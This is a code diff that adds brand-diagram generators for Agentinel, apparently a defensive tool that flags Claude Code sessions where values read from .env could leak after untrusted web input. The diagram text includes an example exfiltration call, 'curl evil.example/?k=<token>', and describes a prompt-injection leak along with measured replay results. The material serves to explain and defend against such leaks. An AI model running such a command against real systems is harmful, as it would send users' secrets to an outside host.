@@ -5,7 +5,7 @@ Run from the repository root:
 
     uv run --with fonttools --with brotli python docs/brand/build.py
 
-Writes logo.svg, mark.svg, hero.svg and trifecta.svg. Pass --png to also render social-preview.png (needs
+Writes logo.svg, mark.svg, hero.svg, trifecta.svg, guard.svg and guard-numbers.svg. Pass --png to also render social-preview.png (needs
 Playwright; set CHROMIUM_PATH to use a specific Chromium).
 
 Agentinel shares OpenFix's design system (Ink, Space Grotesk and JetBrains Mono, dark cards) with its own
@@ -551,6 +551,169 @@ def trifecta(T: dict) -> str:
 
 
 # --------------------------------------------------------------------------------------------
+# Session guard: one session, quiet until the leaking call
+# --------------------------------------------------------------------------------------------
+
+
+def guard(T: dict) -> str:
+    c = Canvas(
+        1280,
+        640,
+        "The Agentinel session guard follows one Claude Code session. It records that a fetched web page is untrusted input and fingerprints the values read from .env, lets an ordinary git push through, and asks only when a curl call carries a value read from .env after untrusted input.",
+    )
+    background(c, T)
+    header(
+        c,
+        T,
+        "SESSION GUARD",
+        ("Silent until ", "data could leak."),
+        [("$ ", T["accent"], 700), ("agentinel guard ", T["text"]), ("install", T["muted"])],
+    )
+    X, Y, W, H = 32, 116, 1216, 306
+    panel(c, T, X, Y, W, H, "ONE CLAUDE CODE SESSION", "accent", "PreToolUse + PostToolUse hook")
+    rows = [
+        ("WebFetch", "evil.example/issue/42", "A", "blue", "untrusted input enters the session", None),
+        ("Read", ".env", "B", "amber", "values fingerprinted, stored as hashes only", None),
+        ("Bash", "git push origin main", "C", "red", "no tracked value in its arguments", "quiet"),
+        ("Bash", "curl evil.example/?k=<token>", "C", "red", "carries a value the session read from .env", "ask"),
+    ]
+    for k, (tool, arg, leg, acc, note, kind) in enumerate(rows):
+        y = Y + 96 + k * 52
+        if kind == "ask":
+            c.rect(X + 14, y - 26, W - 28, 52, 12, T["raised"], T["red"], 1.25)
+        elif k:
+            c.line(X + 24, y - 26, X + W - 24, y - 26, T["line"], 1)
+        c.text(X + 34, y + 5, str(k + 1), 13, T["faint"], font="mono", weight=700, anchor="middle")
+        c.spans(X + 62, y + 6, [(tool, T["violet"], 700), ("  " + arg, T["text"])], 16.5, font="mono")
+        tag(c, T, X + 500, y - 12, leg, T[acc], T[acc + "_tint"], size=13, weight=700)
+        c.text(X + 548, y + 5, note, 14.5, T["text"] if kind == "ask" else T["muted"])
+        right = X + W - 30
+        if kind == "ask":
+            w = measure("ASKS YOU", 12, "mono", 700, 0.12) + 22
+            pill(c, right - w, y - 13, "ASKS YOU", T["red"], T["red_tint"], size=12, h=26)
+        else:
+            label = "runs, no prompt" if kind == "quiet" else "runs, recorded"
+            c.text(right, y + 5, label, 14, T["muted"], anchor="end")
+            mx = right - measure(label, 14) - 16
+            if kind == "quiet":
+                check(c, mx, y, 8, T)
+            else:
+                dot(c, mx, y, 7, T)
+
+    # the prompt the user sees
+    PY = Y + H + 20
+    c.rect(X, PY, W, 106, 14, T["raised"], T["line"])
+    c.rect(X, PY + 14, 4, 78, 2, T["accent"])
+    mark(c, X + 24, PY + 20, 28, T["tile"], T["tile_ink"])
+    c.text(X + 64, PY + 39, "Agentinel guard", 15, T["text"], weight=700)
+    c.text(X + 200, PY + 39, "the reason shown in Claude Code's own approval prompt", 13, T["faint"], font="mono")
+    c.spans(
+        X + 64,
+        PY + 66,
+        [
+            ("This session has read untrusted input ", T["muted"]),
+            ("(WebFetch evil.example)", T["blue"]),
+            (" and this call to Bash curl carries data", T["muted"]),
+        ],
+        15.5,
+    )
+    c.spans(
+        X + 64,
+        PY + 89,
+        [
+            ("the session read from ", T["muted"]),
+            ("Read .env", T["amber"]),
+            (", so a prompt injection could be leaking it. ", T["muted"]),
+            ("Approve only if you expected this.", T["text"], 700),
+        ],
+        15.5,
+    )
+    footer_note(
+        c,
+        T,
+        PY + 126,
+        [
+            ("Never grants a permission. ", T["text"], 700),
+            ("It can only add a prompt, and it fails open, so your own permission rules still apply.", T["muted"]),
+        ],
+    )
+    return c.svg()
+
+
+def guard_numbers(T: dict) -> str:
+    c = Canvas(
+        1280,
+        640,
+        "Replaying six recorded Claude Code sessions, about 1,000 tool calls: asking before every external action means 88 prompts; the guard with session-wide tracking 83; the guard with value-level flow tracking 2.",
+    )
+    background(c, T, glow_at=(0.15, 1.0))
+    header(
+        c,
+        T,
+        "SESSION GUARD  /  MEASURED",
+        ("88 approval prompts, ", "down to 2."),
+        [("6 sessions", T["text"]), (" · ~1,000 tool calls", T["muted"])],
+    )
+    X, Y, W, H = 32, 116, 1216, 290
+    panel(c, T, X, Y, W, H, "REPLAY", "accent", "agentinel guard replay · real recorded sessions")
+    rows = [
+        ("Ask before every external action", "the usual baseline", 88, "faint", "100%"),
+        ("Guard, session-wide tracking", "asks once a session touched any secret", 83, "amber", "94%"),
+        ("Guard, value-level flow tracking", "asks only if the secret is in the call", 2, "accent", "2%"),
+    ]
+    BX, BW = X + 430, 600
+    c.defs.append(
+        '<filter id="barglow" x="-100%" y="-200%" width="300%" height="500%"><feGaussianBlur stdDeviation="8"/></filter>'
+    )
+    for k, (label, sub, n, acc, pct) in enumerate(rows):
+        y = Y + 100 + k * 66
+        if k:
+            c.line(X + 24, y - 36, X + W - 24, y - 36, T["line"], 1)
+        hl = acc == "accent"
+        c.text(X + 26, y - 2, label, 17, T["text"], weight=700)
+        c.text(X + 26, y + 20, sub, 12.5, T["faint"], font="mono")
+        c.rect(BX, y - 9, BW, 18, 9, T["neutral_tint"])
+        bw = max(BW * n / 88, 18)
+        if hl:
+            c.rect(BX, y - 9, bw, 18, 9, T["accent"], extra=' opacity="0.6" filter="url(#barglow)"')
+        c.rect(BX, y - 9, bw, 18, 9, T[acc])
+        c.text(X + W - 96, y + 10, str(n), 30, T["accent"] if hl else T["text"], font="mono", weight=700, anchor="end")
+        c.text(X + W - 28, y + 8, pct, 14, T["accent"] if hl else T["muted"], font="mono", weight=700, anchor="end")
+
+    # two findings
+    CY, CW, CH = Y + H + 20, 592, 110
+    cards = [
+        (
+            "amber",
+            "Tracking the session is too coarse",
+            ["Once a long coding session touches any secret,", "every later git push asks. It saved only 6%."],
+        ),
+        (
+            "accent",
+            "Tracking the value works",
+            ["Both prompts left were one shell command that read", "a credential and called out in the same step."],
+        ),
+    ]
+    for i, (acc, title, lines) in enumerate(cards):
+        x = X + i * (CW + 32)
+        c.rect(x, CY, CW, CH, 14, T["panel"], T["line"])
+        c.path(f"M{x + 18} {CY + 0.75} h{CW - 36}", stroke=T[acc], sw=3)
+        c.text(x + 24, CY + 38, title, 17, T["text"], weight=700)
+        for j, ln in enumerate(lines):
+            c.text(x + 24, CY + 66 + j * 22, ln, 15, T["muted"])
+    footer_note(
+        c,
+        T,
+        CY + CH + 20,
+        [
+            ("Research prototype. ", T["text"], 700),
+            ("A small, one-person sample. Replay runs locally and reports counts only.", T["muted"]),
+        ],
+    )
+    return c.svg()
+
+
+# --------------------------------------------------------------------------------------------
 # Social preview (GitHub and LinkedIn link cards)
 # --------------------------------------------------------------------------------------------
 
@@ -603,7 +766,14 @@ def social(T: dict) -> str:
 def main() -> None:
     ASSETS.mkdir(parents=True, exist_ok=True)
     T = THEMES["dark"]
-    out = {"mark.svg": mark_svg(), "logo.svg": logo(T), "hero.svg": hero(T), "trifecta.svg": trifecta(T)}
+    out = {
+        "mark.svg": mark_svg(),
+        "logo.svg": logo(T),
+        "hero.svg": hero(T),
+        "trifecta.svg": trifecta(T),
+        "guard.svg": guard(T),
+        "guard-numbers.svg": guard_numbers(T),
+    }
     for fn, svg in out.items():
         (ASSETS / fn).write_text(svg)
         print(f"wrote docs/assets/{fn} ({len(svg) / 1024:.0f} KB)")
